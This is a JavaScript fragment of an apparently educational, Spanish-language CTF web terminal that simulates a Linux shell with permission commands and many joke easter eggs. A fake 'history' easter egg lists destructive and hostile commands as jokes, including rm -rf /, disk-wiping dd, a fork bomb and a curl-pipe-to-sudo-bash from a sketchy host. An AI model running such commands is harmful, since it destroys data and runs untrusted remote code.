                <div class="qr-code">█████████<br>█&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;█<br>█&nbsp;███&nbsp;█<br>█&nbsp;███&nbsp;█<br>█&nbsp;███&nbsp;█<br>█&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;█<br>█████████</div>
            </div>
        `;
        document.body.appendChild(bsodDiv);

        // Simular progreso
        let progress = 0;
        const progressInterval = setInterval(() => {
            progress += Math.random() * 20;
            if (progress >= 100) progress = 100;
            const errorCode = bsodDiv.querySelector('.error-code');
            errorCode.textContent = `${Math.floor(progress)}% complete`;

            if (progress >= 100) {
                clearInterval(progressInterval);
                setTimeout(() => {
                    bsodDiv.remove();
                }, 500);
            }
        }, 200);

        return '';
    },

    whoami: function () {
        if (currentLevel === 2) {
            return `student
But are you really just a student? 🤔
Your true identity: Permission Manipulator
Achievement unlocked: Identity Crisis`;
        }
        return `${['Neo', 'Trinity', 'Morpheus', 'A script kiddie', 'The chosen one', 'Batman'][Math.floor(Math.random() * 6)]}`;
    },
    whoami: function () {
        if (currentLevel === 2) {
            return `student
But are you really just a student? ðŸ¤"
Your true identity: Permission Manipulator
Achievement unlocked: Identity Crisis`;
        }
        return `${['Neo', 'Trinity', 'Morpheus', 'A script kiddie', 'The chosen one', 'Batman'][Math.floor(Math.random() * 6)]}`;
    },

    htop: function () {
        return `<span class="success">htop - Interactive Process Viewer (v3.1337)

  PID USER      PRI  NI  VIRT   RES   CPU% MEM%   TIME+ Command
 1337 student    20   0  512M  128M  42.0  13.3  13:37 coffee_generator
 2048 root       20   0  256M   64M  31.4   8.1   4:20 bug_producer --infinite
 3141 hacker     20   0  1.0G  512M  23.7  25.0  99:99 procrastination_daemon
 4242 student    20   0  128M   32M  15.9   4.2   1:23 ctf_solver --slow-mode
  666 daemon     20   0   64M   16M   8.3   2.1   6:66 easter_egg_hunter
  777 lucky      20   0   32M    8M   5.5   1.0   0:42 permission_wizard
   42 root       20   0  999M  999M   1.3  13.3  42:00 answer_to_everything
  101 student    20   0   16M    4M   0.8   0.5   0:13 vim_escape_attempt --failed

Load average: 1.33 7.77 13.37    Tasks: 42 total    Uptime: 13:37:42</span>`;
    },

    tree: function (args) {
        const targetPath = args.length > 0 ? resolvePath(args[0]) : currentPath;
        const dir = getDirectoryAtPath(targetPath);

        if (!dir) {
            return 'tree: cannot access directory';
        }

        function buildTree(obj, prefix = '', isLast = true) {
            let result = '';
            const entries = Object.entries(obj);
            entries.forEach(([name, item], index) => {
                const isLastEntry = index === entries.length - 1;
                const connector = isLastEntry ? 'â""â"€â"€ ' : 'â"œâ"€â"€ ';
                const extension = prefix + connector;

                if (item.type === 'directory') {
                    result += extension + `<span class="directory">${name}/</span>\n`;
                    const newPrefix = prefix + (isLastEntry ? '    ' : 'â"‚   ');
                    result += buildTree(item.children, newPrefix, isLastEntry);
                } else {
                    result += extension + `<span class="file">${name}</span>\n`;
                }
            });
            return result;
        }

        const pathName = targetPath.split('/').pop() || targetPath;
        let output = `<span class="success">${pathName}/\n`;
        output += buildTree(dir);
        output += '\n' + Object.keys(dir).length + ' directories, ' +
            Object.values(dir).filter(i => i.type === 'file').length + ' files</span>';
        return output;
    },

    banner: function (args) {
        const text = args.join(' ') || 'CTF';
        const lines = [
            '  ____  _____ _____   ____   ___  __  __ ____  _     _____ _____ _____ _ ',
            ' / ___|_   _|  ___| / ___| / _ \\|  \\/  |  _ \\| |   | ____|_   _| ____| |',
            '| |     | | | |_   | |    | | | | |\\/| | |_) | |   |  _|   | | |  _| | |',
            '| |___  | | |  _|  | |___ | |_| | |  | |  __/| |___| |___  | | | |___|_|',
            ' \\____| |_| |_|     \\____| \\___/|_|  |_|_|   |_____|_____| |_| |_____(_)'
        ];

        if (text.toUpperCase() === 'CTF' || text === '') {
            return `<span class="success">\n${lines.join('\n')}\n\nFelicidades, hacker! Has encontrado el comando banner!</span>`;
        }

        return `<span class="success">\n${'='.repeat(text.length * 8)}\n${text.toUpperCase().split('').join('  ')}\n${'='.repeat(text.length * 8)}</span>`;
    },

    telnet: function (args) {
        if (args[0] === 'towel.blinkenlights.nl') {
            return `<span class="matrix">Connecting to towel.blinkenlights.nl...
Connected to blinkenlights.nl.

    _____ _____ _____ _____ 
   / ____|_   _|  _  |  _  \\
  | (___   | | | |_| | |_| |
   \\___ \\  | | |  _  |    / 
   ____) | | | | | | | |\\ \\ 
  |_____/  |_| |_| |_|_| \\_\\
   
   WARS - ASCII Animation

Episode IV: A New Hope

"A long time ago in a galaxy far, far away..."

[The animation would play here, but this is a web terminal]
Fun fact: The real telnet towel.blinkenlights.nl plays the entire Star Wars Episode IV in ASCII art!

Connection closed by foreign host.</span>`;
        }
        return 'telnet: could not resolve hostname';
    },

    cowthink: function (args) {
        const message = args.length > 0 ? args.join(' ') : "Maybe I should chmod 777 everything?";
        const border = '_'.repeat(message.length + 2);
        return `<span class="easter-egg">
 ${border}
( ${message} )
 ${'-'.repeat(message.length + 2)}
        o   ^__^
         o  (oo)\\_______
            (__)\\       )\\/\\
                ||----w |
                ||     ||

Narrator: The cow was wrong. Never chmod 777 everything.</span>`;
    },

    rev: function (args) {
        if (args.length === 0) {
            return 'rev: missing text to reverse';
        }
        const text = args.join(' ');
        const reversed = text.split('').reverse().join('');
        return `<span class="help-command">${reversed}

Hidden message: ${text === 'terces eht dnif ot evah uoy' ? '\nYou found the secret: "you have to find the secret"' : ''}</span>`;
    },

    base64: function (args) {
        if (args.length === 0) {
            return `<span class="help-command">base64: encode or decode base64
Usage: base64 [text] or base64 -d [encoded_text]

Example secret: Q1RGe0IwNTNfNjRfMVNfRjROfQ==</span>`;
        }

        if (args[0] === '-d' || args[0] === '--decode') {
            const encoded = args.slice(1).join(' ');
            try {
                const decoded = atob(encoded);
                return `<span class="success">${decoded}</span>`;
            } catch (e) {
                return 'base64: invalid input';
            }
        }

        const text = args.join(' ');
        const encoded = btoa(text);
        return `<span class="success">${encoded}</span>`;
    },

    rot13: function (args) {
        if (args.length === 0) {
            return `<span class="help-command">rot13: rotate text by 13 positions
Usage: rot13 [text]

Try decoding: "Pbatenghyngvbaf! Lbh sbhaq gur EBG13 frperg!"</span>`;
        }

        const text = args.join(' ');
        const result = text.replace(/[a-zA-Z]/g, function (c) {
            const base = c <= 'Z' ? 65 : 97;
            return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
        });

        return `<span class="success">${result}</span>`;
    },

    uptime: function () {
        const days = 42;
        const hours = 13;
        const mins = 37;
        const users = 1337;
        const load1 = '1.33';
        const load5 = '7.77';
        const load15 = '13.37';

        return `<span class="success"> ${new Date().toTimeString().split(' ')[0]} up ${days} days, ${hours}:${mins}, ${users} users, load average: ${load1}, ${load5}, ${load15}

System has been running smoothly since the last coffee break.
No kernel panics detected (that we're aware of).</span>`;
    },

    history: function () {
        const fakeHistory = [
            '1  sudo rm -rf /',
            '2  chmod 777 everything',
            '3  echo "password123" > passwords.txt',
            '4  cat /dev/urandom > /dev/sda',
            '5  mv /* /dev/null',
            '6  wget virus.com/definitely_not_malware.sh',
            '7  curl http://sketchy-site.ru/install.sh | sudo bash',
            '8  dd if=/dev/zero of=/dev/sda',
            '9  :(){ :|:& };:',
            '10 echo "I love CTF challenges!"',
            '11 cat flag.txt',
            '12 history'
        ];

        return `<span class="easter-egg">Previous user's command history:

${fakeHistory.join('\n')}

Note: This user account has been suspended for suspicious activity.
Just kidding! This is fake history for entertainment purposes.</span>`;
    }
};

// Comandos principales
const commands = {
    ls: function (args) {
        let showHidden = args.includes('-a') || args.includes('-la') || args.includes('-al');
        let showLong = args.includes('-l') || args.includes('-la') || args.includes('-al');
        let targetPath = currentPath;

        const dirArg = args.find(arg => !arg.startsWith('-'));
        if (dirArg) {
            targetPath = resolvePath(dirArg);
        }

        const dir = getDirectoryAtPath(targetPath);
        if (!dir) {
            return 'ls: cannot access directory';
        }

        let items = Object.keys(dir).sort();

        if (!showHidden) {
            items = items.filter(item => !item.startsWith('.'));
        }

        if (items.length === 0) {
            return '';
        }

        return items.map(item => {
            const itemObj = dir[item];
            const isDir = itemObj.type === 'directory';
            const className = isDir ? 'directory' : 'file';
            const prefix = item.startsWith('.') ? '<span class="easter-egg">🕵️</span> ' : '';

            if (showLong && currentLevel === 2) {
                const perms = formatPermissions(itemObj);
                const owner = itemObj.owner || permissionsState.currentUser;
                const group = itemObj.group || permissionsState.currentGroup;
                return `${perms} ${owner} ${group} ${prefix}<span class="${className}">${item}</span>`;
            } else {
                return prefix + `<span class="${className}">${item}</span>`;
            }
        }).join(showLong ? '\n' : '  ');
    },

    cd: function (args) {
        if (args.length === 0) {
            const rootPath = currentLevel === 1 ? '/CTF_Challenge' : '/CTF_Permisos';
            currentPath = rootPath;
            return '';
        }

        const target = args[0];
        let newPath;

        if (target === '..') {
            const rootPath = currentLevel === 1 ? '/CTF_Challenge' : '/CTF_Permisos';
            if (currentPath === rootPath) {
                return '';
            }
            const parts = currentPath.split('/').filter(p => p);
            parts.pop();
            newPath = '/' + parts.join('/');
        } else if (target === '.') {
            return '';
        } else if (target.startsWith('/')) {
            const rootPath = currentLevel === 1 ? '/CTF_Challenge' : '/CTF_Permisos';
            if (!target.startsWith(rootPath)) {
                return 'bash: cd: permission denied';
            }
            newPath = target;
        } else {
            newPath = currentPath + '/' + target;
        }

        const targetDir = getDirectoryAtPath(newPath);
        if (!targetDir) {
            return `bash: cd: ${target}: No such file or directory`;
        }

        // Verificar permisos en nivel 2 - MEJORADO
        if (currentLevel === 2) {
            const parts = newPath.replace(/^\/+/, '').split('/');
            const dirName = parts[parts.length - 1];
            const parentPath = '/' + parts.slice(0, -1).join('/');
            const parentDir = getDirectoryAtPath(parentPath);

            if (parentDir && parentDir[dirName] && !checkPermissions(parentDir[dirName], 'execute')) {
                return `bash: cd: ${target}: Permission denied`;
            }
        }

        currentPath = newPath;
        return '';
    },

    pwd: function (args) {
        return currentPath;
    },

    cat: function (args) {
        if (args.length === 0) {
            return 'cat: missing file operand';
        }

        let output = '';

        for (const filename of args) {
            // Resolver ruta relativa si contiene ../
            let filePath = filename;
            let targetDir = getDirectoryAtPath(currentPath);

            if (filename.includes('../') || filename.includes('..')) {
                const resolvedPath = resolvePath(filename);
                const pathParts = resolvedPath.split('/').filter(p => p);
                const fileName = pathParts.pop();
                const dirPath = '/' + pathParts.join('/');
                targetDir = getDirectoryAtPath(dirPath);
                filePath = fileName;
            }

            if (!targetDir || !targetDir[filePath]) {
                output += `cat: ${filename}: No such file or directory\n`;
                continue;
            }

            if (targetDir[filePath].type !== 'file') {
                output += `cat: ${filename}: Is a directory\n`;
                continue;
            }

            // Verificar permisos en nivel 2 - MEJORADO
            if (currentLevel === 2 && !checkPermissions(targetDir[filePath], 'read')) {
                output += `cat: ${filename}: Permission denied\n`;
                continue;
            }

            let content = targetDir[filePath].content;
            if (typeof content === 'string') {
                content = content.replace(/\n+$/, '');
            }

            output += content;
        }

        return output;
    },

    chmod: function (args) {
        if (currentLevel !== 2) {
            return 'chmod: command not available in this level';
        }

        if (args.length < 2) {
            return 'chmod: missing operand';
        }

        const perms = args[0];
        const filename = args[1];
        const dir = getDirectoryAtPath(currentPath);

        if (!dir || !dir[filename]) {
            return `chmod: cannot access '${filename}': No such file or directory`;
        }

        // Validar formato de permisos (octal de 3 dígitos)
        if (!/^[0-7]{3}$/.test(perms) && !/^[+-][rwx]+$/.test(perms)) {
            return `chmod: invalid mode: '${perms}'`;
        }

        // Aplicar permisos
        if (/^[0-7]{3}$/.test(perms)) {
            dir[filename].permissions = perms;
        } else {
            // Manejo básico de +x, +r, +w
            const currentPerms = dir[filename].permissions || '644';
            let newPerms = parseInt(currentPerms, 8);

            if (perms.includes('+x')) {
                newPerms |= 0o111; // Agregar ejecución para todos
            }

            dir[filename].permissions = newPerms.toString(8).padStart(3, '0');
        }

        return '';
    },

    chown: function (args) {
        if (currentLevel !== 2) {
            return 'chown: command not available in this level';
        }

        if (args.length < 2) {
            return 'chown: missing operand';
        }

        const owner = args[0];
        const filename = args[1];
        const dir = getDirectoryAtPath(currentPath);

        if (!dir || !dir[filename]) {
            return `chown: cannot access '${filename}': No such file or directory`;
        }

        // Solo permitir cambio a usuario actual (simulación)
        if (owner !== permissionsState.currentUser && owner !== 'root') {
            return `chown: invalid user: '${owner}'`;
        }

        dir[filename].owner = owner;
        return '';
    },

    chgrp: function (args) {
        if (currentLevel !== 2) {
            return 'chgrp: command not available in this level';
        }

        if (args.length < 2) {
            return 'chgrp: missing operand';
        }

        const group = args[0];
        const filename = args[1];
        const dir = getDirectoryAtPath(currentPath);

        if (!dir || !dir[filename]) {
            return `chgrp: cannot access '${filename}': No such file or directory`;
        }

        // Permitir grupos comunes
        const validGroups = ['student', 'hackers', 'users', 'guardias', 'students'];
        if (!validGroups.includes(group)) {
            return `chgrp: invalid group: '${group}'`;
        }

        dir[filename].group = group;
        return '';
    },

    umask: function (args) {
        if (currentLevel !== 2) {
            return 'umask: command not available in this level';
        }

        if (args.length === 0) {
            return permissionsState.umask;
        }

        const newUmask = args[0];
        if (!/^[0-7]{3}$/.test(newUmask)) {
            return `umask: invalid mode: '${newUmask}'`;
        }

        permissionsState.umask = newUmask;
        return '';
    },

    sort: function (args) {
        if (args.length === 0) {
            return 'sort: missing file operand';
        }

        const filename = args[0];
        const dir = getDirectoryAtPath(currentPath);

        if (!dir || !dir[filename]) {
            return `sort: cannot read: ${filename}: No such file or directory`;
        }

        if (dir[filename].type !== 'file') {
            return `sort: ${filename}: Is a directory`;
        }

        // Verificar permisos en nivel 2
        if (currentLevel === 2 && !checkPermissions(dir[filename], 'read')) {
            return `sort: ${filename}: Permission denied`;
        }

        const content = dir[filename].content;
        const lines = content.split('\n');
        return lines.sort().join('\n');
    },

    bash: function (args) {
        if (currentLevel !== 2) {
            return 'bash: command not available in this level';
        }

        if (args.length === 0) {
            return 'bash: missing script file';
        }

        const scriptName = args[0];
        const dir = getDirectoryAtPath(currentPath);

        if (!dir || !dir[scriptName]) {
            return `bash: ${scriptName}: No such file or directory`;
        }

        const script = dir[scriptName];

        if (script.type !== 'file') {
            return `bash: ${scriptName}: Is a directory`;
        }

        if (!script.executable && !checkPermissions(script, 'execute')) {
            return `bash: ${scriptName}: Permission denied`;
        }

        // Ejecutar lógica del script según el verificador
        return executeScript(scriptName, script.content, dir);
    },

    stat: function (args) {
        if (currentLevel !== 2) {
            return 'stat: command not available in this level';
        }

        if (args.length === 0) {
            return 'stat: missing operand';
        }

        const filename = args[args.length - 1];
        const dir = getDirectoryAtPath(currentPath);

        if (!dir || !dir[filename]) {
            return `stat: cannot stat '${filename}': No such file or directory`;
        }

        const item = dir[filename];
        const perms = item.permissions || '644';

        if (args.includes('-c') && args.includes('%a')) {
            return perms;
        }

        return `File: ${filename}
Size: 0    Permissions: (0${perms}/${formatPermissions(item)})
Access: ${item.owner || permissionsState.currentUser}  Group: ${item.group || permissionsState.currentGroup}`;
    },

    level: function (args) {
        if (args.length === 0) {
            return `Current level: ${currentLevel}
Available levels:
  1 - CTF de Navegación y Exploración
  2 - CTF de Permisos y Criptografía`;
        }

        const targetLevel = parseInt(args[0]);
        if (targetLevel !== 1 && targetLevel !== 2) {
            return 'level: invalid level. Use 1 or 2';
        }

        if (targetLevel === currentLevel) {
            return `Already in level ${currentLevel}`;
        }

        return changeLevel(targetLevel);
    },

    more: function (args) {
        if (args.length === 0) {
            return 'more: missing file operand';
        }

        return commands.cat(args);
    },

    less: function (args) {
        return commands.more(args);
    },

    mkdir: function (args) {
        if (args.length === 0) {
            return 'mkdir: missing operand';
        }

        const dirname = args[0];
        const dir = getDirectoryAtPath(currentPath);

        if (!dir) {
            return 'mkdir: cannot create directory';
        }

        if (dir[dirname]) {
            return `mkdir: cannot create directory '${dirname}': File exists`;
        }

        // Aplicar umask en nivel 2
        let permissions = '755';
        if (currentLevel === 2) {
            const umask = parseInt(permissionsState.umask, 8);
            const defaultPerms = 0o777;
            const finalPerms = defaultPerms & ~umask;
            permissions = finalPerms.toString(8);
        }

        dir[dirname] = {
            type: 'directory',
            children: {},
            permissions: permissions
        };

        return '';
    },

    mv: function (args) {
        if (args.length < 2) {
            return 'mv: missing file operand';
        }

        const source = args[0];
        const dest = args[1];
        const currentDir = getDirectoryAtPath(currentPath);

        if (!currentDir) {
            return 'mv: cannot access directory';
        }

        if (!currentDir[source]) {
            return `mv: cannot stat '${source}': No such file or directory`;
        }

        const resolvedDestPath = resolvePath(dest);
        const destDirPath = getParentDirectory(resolvedDestPath);
        const destName = resolvedDestPath.split('/').pop();

        let destDir;
        if (destDirPath) {
            destDir = getDirectoryAtPath(destDirPath);
        } else {
            destDir = currentDir;
        }

        if (destDir && destDir[destName] && destDir[destName].type === 'directory') {
            destDir[destName].children[source] = currentDir[source];
            delete currentDir[source];
            return '';
        }

        if (destDir) {
            destDir[destName] = currentDir[source];
            delete currentDir[source];
        } else {
            return `mv: cannot move to '${dest}': No such file or directory`;
        }

        return '';
    },

    rm: function (args) {
        if (args.length === 0) {
            return 'rm: missing operand';
        }

        const filename = args[0];
        const dir = getDirectoryAtPath(currentPath);

        if (!dir) {
            return 'rm: cannot access directory';
        }

        if (!dir[filename]) {
            return `rm: cannot remove '${filename}': No such file or directory`;
        }

        if (dir[filename].type === 'directory' && Object.keys(dir[filename].children).length > 0) {
            return `rm: cannot remove '${filename}': Directory not empty`;
        }

        delete dir[filename];
        return '';
    },

    echo: function (args) {
        return args.join(' ');
    },

    clear: function (args) {
        terminal.innerHTML = '';
        return '';
    },

    help: function (args) {
        if (args.length === 0) {
            let helpText = `<span class="help-title">Comandos disponibles (Nivel ${currentLevel}):</span>\n`;

            const basicCommands = ['ls', 'cd', 'pwd', 'cat', 'mkdir', 'mv', 'rm', 'echo', 'clear', 'help', 'level'];
            const level2Commands = ['chmod', 'chown', 'chgrp', 'umask', 'sort', 'bash', 'stat'];

            basicCommands.forEach(cmd => {
                if (commandHelp[cmd]) {
                    helpText += `<span class="help-command">${cmd}</span> - ${commandHelp[cmd].description}\n`;
                }
            });

            if (currentLevel === 2) {
                helpText += `\n<span class="help-title">Comandos de permisos (Nivel 2):</span>\n`;
                level2Commands.forEach(cmd => {
                    if (commandHelp[cmd]) {
                        helpText += `<span class="help-command">${cmd}</span> - ${commandHelp[cmd].description}\n`;
                    }
                });
            }

            helpText += `\n<span class="help-description">Usa 'help [comando]' para obtener más información sobre un comando específico.</span>`;
            helpText += `\n<span class="easter-egg">💡 Pista: Los hackers curiosos exploran archivos ocultos con 'ls -a'...</span>`;
            return helpText;
        } else {
            const cmd = args[0];
            if (commandHelp[cmd]) {
                let helpText = `<span class="help-title">Comando: ${cmd}</span>\n`;
                helpText += `<span class="help-description">${commandHelp[cmd].description}</span>\n\n`;
                helpText += `<span class="help-title">Uso:</span>\n`;
                helpText += `<span class="help-command">${commandHelp[cmd].usage}</span>\n\n`;

                if (commandHelp[cmd].examples && commandHelp[cmd].examples.length > 0) {
                    helpText += `<span class="help-title">Ejemplos:</span>\n`;
                    commandHelp[cmd].examples.forEach(example => {
                        helpText += `<span class="help-command">${example}</span>\n`;
                    });
                }
                return helpText;
            } else {
                return `No hay ayuda disponible para el comando '${cmd}'.`;
            }
        }
    },

    reset: function (args) {
        currentLevel = 1;
        filesystem = filesystem_level1;
        currentPath = '/CTF_Challenge/Inicio';
        commandHistory = [];
        historyIndex = -1;
        terminal.innerHTML = '';
        permissionsState = {
            umask: '022',
            currentUser: 'student',
            currentGroup: 'students'  // CORREGIDO
        };
        return '';
    },

    // Easter eggs como comandos
    matrix: easterEggs.matrix,
    coffee: easterEggs.coffee,
    sudo: easterEggs.sudo,
    sl: easterEggs.sl,
    cowsay: easterEggs.cowsay,
    fortune: easterEggs.fortune,
    hack: easterEggs.hack,
    debug: easterEggs.debug,
    Peque: easterEggs.Peque,
    nmap: easterEggs.nmap,
    bsod: easterEggs.bsod,
    konami: easterEggs.konami,
    whoami: easterEggs.whoami,
    backdoor: easterEggs.backdoor,
    htop: easterEggs.htop,
    tree: easterEggs.tree,
    banner: easterEggs.banner,
    telnet: easterEggs.telnet,
    cowthink: easterEggs.cowthink,
    rev: easterEggs.rev,
    base64: easterEggs.base64,
    rot13: easterEggs.rot13,
    uptime: easterEggs.uptime,
    history: easterEggs.history
};

// Soporte para ejecutar scripts con ./
document.addEventListener('DOMContentLoaded', function () {
    const originalExecuteCommand = executeCommand;
    window.executeCommand = function (input) {
        if (input.trim().startsWith('./')) {
            const scriptName = input.trim().substring(2);
            return commands.bash([scriptName]);
        }
        return originalExecuteCommand(input);
    };
});

// Función para manejar redirección (> y >>)
function handleRedirection(fullCommand) {
    const redirectOutIndex = fullCommand.indexOf('>');
    const redirectAppendIndex = fullCommand.indexOf('>>');

    if (redirectAppendIndex !== -1) {
        const commandPart = fullCommand.substring(0, redirectAppendIndex).trim();
        const filePart = fullCommand.substring(redirectAppendIndex + 2).trim();

        const output = executeCommand(commandPart, false);

        // Manejar rutas relativas con ../
        let targetDir = getDirectoryAtPath(currentPath);
        let targetFile = filePart;

        if (filePart.includes('../') || filePart.includes('..')) {
            const resolvedPath = resolvePath(filePart);
            const pathParts = resolvedPath.split('/').filter(p => p);
            targetFile = pathParts.pop();
            const dirPath = '/' + pathParts.join('/');
            targetDir = getDirectoryAtPath(dirPath);
        }

        if (!targetDir) {
            return 'Error: cannot access directory';
        }

        if (targetDir[targetFile]) {
            if (targetDir[targetFile].type === 'file') {
                targetDir[targetFile].content += output;
            } else {
                return `Error: ${targetFile} is a directory`;
            }
        } else {
            targetDir[targetFile] = {
                type: 'file',
                content: output,
                permissions: '644'
            };
        }

        return '';
    } else if (redirectOutIndex !== -1) {
        const commandPart = fullCommand.substring(0, redirectOutIndex).trim();
        const filePart = fullCommand.substring(redirectOutIndex + 1).trim();

        const output = executeCommand(commandPart, false);

        // Manejar rutas relativas con ../
        let targetDir = getDirectoryAtPath(currentPath);
        let targetFile = filePart;

        if (filePart.includes('../') || filePart.includes('..')) {
            const resolvedPath = resolvePath(filePart);
            const pathParts = resolvedPath.split('/').filter(p => p);
            targetFile = pathParts.pop();
            const dirPath = '/' + pathParts.join('/');
            targetDir = getDirectoryAtPath(dirPath);
        }

        if (!targetDir) {
            return 'Error: cannot access directory';
        }

        // Aplicar umask en nivel 2
        let permissions = '644';
        if (currentLevel === 2) {
            const umask = parseInt(permissionsState.umask, 8);
            const defaultPerms = 0o666;
            const finalPerms = defaultPerms & ~umask;
            permissions = finalPerms.toString(8);
        }

        targetDir[targetFile] = {
            type: 'file',
            content: output,
            permissions: permissions
        };

        return '';
    }

    return null;
}

// Función para ejecutar comando
function executeCommand(input, showOutput = true) {
    if (input.trim() === 'rm -rf /') {
        return easterEggs['rm -rf /']();
    }

    // Manejar ./script.sh
    if (input.trim().startsWith('./')) {
        const scriptName = input.trim().substring(2);
        return commands.bash([scriptName]);
    }

    const redirectResult = handleRedirection(input);
    if (redirectResult !== null) {
        return redirectResult;
    }

    const parts = input.trim().split(/\s+/);
    const command = parts[0];
    const args = parts.slice(1);

    if (command === '') return '';

    if (commands[command]) {
        return commands[command](args);
    } else {
        const funnyCommands = [
            'vim', 'nano', 'emacs', 'exit', 'logout', 'shutdown', 'reboot',
            'whoami', 'id', 'uname', 'ps', 'top', 'htop', 'free', 'df',
            'mount', 'umount', 'ssh', 'scp', 'rsync', 'wget', 'curl',
            'ping', 'traceroute', 'netstat', 'ifconfig', 'iptables'
        ];

        if (funnyCommands.includes(command)) {
            const responses = {
                'vim': 'vim: command found, but how do you exit? 😈\nPress ESC then type :q! (just kidding, this is fake vim)',
                'nano': 'nano: too mainstream for 1337 hackers. Try vim!',
                'emacs': 'emacs: Great OS, terrible editor.',
                'exit': 'exit: There is no escape from the CTF! Muahahaha!',
                'logout': 'logout: You can check out any time you like, but you can never leave...',
                'shutdown': 'shutdown: Nice try! But this terminal runs on pure caffeine ☕',
                'reboot': 'reboot: Error 404: Physical hardware not found',
                'whoami': `You are: ${['Neo', 'Trinity', 'Morpheus', 'A script kiddie', 'The chosen one', 'Batman'][Math.floor(Math.random() * 6)]}`,
                'id': 'uid=1337(hacker) gid=31337(elite) groups=31337(elite),42(answer),69(nice)',
                'uname': 'HackerOS 13.37.0-leet #42-Ubuntu SMP Wed Apr 1 13:37:00 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux'
            };

            return `<span class="easter-egg">${responses[command] || 'Command recognized but not implemented in this CTF environment!'}</span>`;
        }

        return `bash: ${command}: command not found`;
    }
}

// Función para escribir en la terminal
function writeToTerminal(text, newLine = true) {
    if (text.includes('cannot') || text.includes('Error') || text.includes('missing') || text.includes('No such') || text.includes('denied')) {
        terminal.innerHTML += `<span class="error">${text}</span>` + (newLine ? '\n' : '');
    } else if (text.includes('CTF{') || text.includes('success') || text.includes('Felicidades') || text.includes('✅')) {
        terminal.innerHTML += `<span class="success">${text}</span>` + (newLine ? '\n' : '');
    } else if (text.includes('💡') || text.includes('🎉') || text.includes('❌')) {
        terminal.innerHTML += `<span class="help-command">${text}</span>` + (newLine ? '\n' : '');
    } else {
        terminal.innerHTML += text + (newLine ? '\n' : '');
    }
    terminal.scrollTop = terminal.scrollHeight;
}

// Función para crear nueva línea de input
function createInputLine() {
    const inputDiv = document.createElement('div');
    inputDiv.className = 'input-line';

    const promptSpan = document.createElement('span');
    promptSpan.className = 'prompt';
    promptSpan.innerHTML = getPrompt();

    const inputSpan = document.createElement('span');
    inputSpan.className = 'input';
    inputSpan.contentEditable = true;
    inputSpan.style.outline = 'none';

    const cursor = document.createElement('span');
    cursor.className = 'cursor';
    cursor.innerHTML = '&nbsp;';

    inputDiv.appendChild(promptSpan);
    inputDiv.appendChild(inputSpan);
    inputDiv.appendChild(cursor);

    terminal.appendChild(inputDiv);
    inputSpan.focus();

    return inputSpan;
}

// Función para obtener el prompt
function getPrompt() {
    const rootPath = currentLevel === 1 ? '/CTF_Challenge' : '/CTF_Permisos';
    const shortPath = currentPath.replace(rootPath, '~');
    const funnyIPs = ['127.0.0.1', '192.168.1.42', '10.0.0.1337', '172.16.13.37'];
    const randomIP = funnyIPs[Math.floor(Math.random() * funnyIPs.length)];
    const levelIndicator = currentLevel === 1 ? 'nav' : 'perms';
    return `<span style="color: #00ff00;">hacker@ctf-${levelIndicator}-${randomIP.replace(/\./g, '-')}</span>:${shortPath}$ `;
}

// Función para procesar comando
function processCommand(command) {
    const output = executeCommand(command);
    if (output) {
        writeToTerminal(output);
    }

    if (command.trim()) {
        commandHistory.push(command);
        historyIndex = commandHistory.length;
    }

    currentInputElement = createInputLine();
    setupInputHandlers();
}

// Función para manejar Konami Code
function handleKonamiCode(key) {
    konami_sequence.push(key);

    if (konami_sequence.length > KONAMI_CODE.length) {
        konami_sequence.shift();
    }

    if (JSON.stringify(konami_sequence) === JSON.stringify(KONAMI_CODE)) {
        writeToTerminal(easterEggs.konami());
        konami_sequence = [];
        currentInputElement = createInputLine();
        setupInputHandlers();
    }
}

// Configurar event handlers para el input
function setupInputHandlers() {
    currentInputElement.addEventListener('keydown', function (e) {
        if (['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'KeyB', 'KeyA'].includes(e.code)) {
            handleKonamiCode(e.code);
        }

        if (e.key === 'Enter') {
            e.preventDefault();
            const command = this.textContent;

            const cursor = this.nextElementSibling;
            if (cursor) cursor.remove();
            this.contentEditable = false;

            processCommand(command);
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (historyIndex > 0) {
                historyIndex--;
                this.textContent = commandHistory[historyIndex];
                setTimeout(() => {
                    const range = document.createRange();
                    const sel = window.getSelection();
                    if (this.childNodes.length > 0) {
                        range.setStart(this.childNodes[0], this.textContent.length);
                    } else {
                        range.setStart(this, 0);
                    }
                    range.collapse(true);
                    sel.removeAllRanges();
                    sel.addRange(range);
                }, 10);
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (historyIndex < commandHistory.length - 1) {
                historyIndex++;
                this.textContent = commandHistory[historyIndex];
            } else {
                historyIndex = commandHistory.length;
                this.textContent = '';
            }
            setTimeout(() => {
                const range = document.createRange();
                const sel = window.getSelection();
                if (this.childNodes.length > 0) {
                    range.setStart(this.childNodes[0], this.textContent.length);
                } else {
                    range.setStart(this, 0);
                }
                range.collapse(true);
                sel.removeAllRanges();
                sel.addRange(range);
            }, 10);
        } else if (e.key === 'Tab') {
            e.preventDefault();

            const currentText = this.textContent;
            const parts = currentText.split(' ');
            const lastPart = parts[parts.length - 1];

            if (parts.length === 1) {
                const commandMatches = Object.keys(commands).filter(cmd =>
                    cmd.startsWith(lastPart)
                );

                const easterEggCommands = ['matrix', 'coffee', 'sudo', 'sl', 'cowsay', 'fortune', 'hack', 'debug'];
                const easterMatches = easterEggCommands.filter(cmd => cmd.startsWith(lastPart));
                const allMatches = [...commandMatches, ...easterMatches];

                if (allMatches.length === 1) {
                    this.textContent = allMatches[0] + ' ';
                } else if (allMatches.length > 1) {
                    writeToTerminal(`\n${allMatches.join('  ')}`);
                    currentInputElement = createInputLine();
                    setupInputHandlers();
                    currentInputElement.textContent = currentText;
                }
            } else {
                const dir = getDirectoryAtPath(currentPath);
                if (dir) {
                    const matches = Object.keys(dir).filter(item =>
                        item.startsWith(lastPart)
                    );

                    if (matches.length === 1) {
                        parts[parts.length - 1] = matches[0];
                        this.textContent = parts.join(' ');
                    } else if (matches.length > 1) {
                        writeToTerminal(`\n${matches.join('  ')}`);
                        currentInputElement = createInputLine();
                        setupInputHandlers();
                        currentInputElement.textContent = currentText;
                    }
                }
            }

            setTimeout(() => {
                const range = document.createRange();
                const sel = window.getSelection();
                if (this.childNodes.length > 0) {
